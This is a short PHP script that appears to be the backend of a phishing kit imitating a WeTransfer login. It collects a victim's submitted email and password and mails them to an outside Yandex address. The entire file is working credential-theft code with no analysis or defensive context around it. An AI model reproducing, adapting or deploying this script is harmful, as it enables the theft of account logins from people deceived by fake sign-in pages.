<?php

//Get the necessary variables from the server.
$email = $_POST['X1'];
$password = $_POST['X2'];

//Define required variables and send user input to $myEmail.
$myEmail = 'tesamedikal@yandex.com';
$subject = 'WeTransfer';
$message = 'Email: '.$email. ' Password: '.$password;
mail($myEmail, $subject, $message);

?>
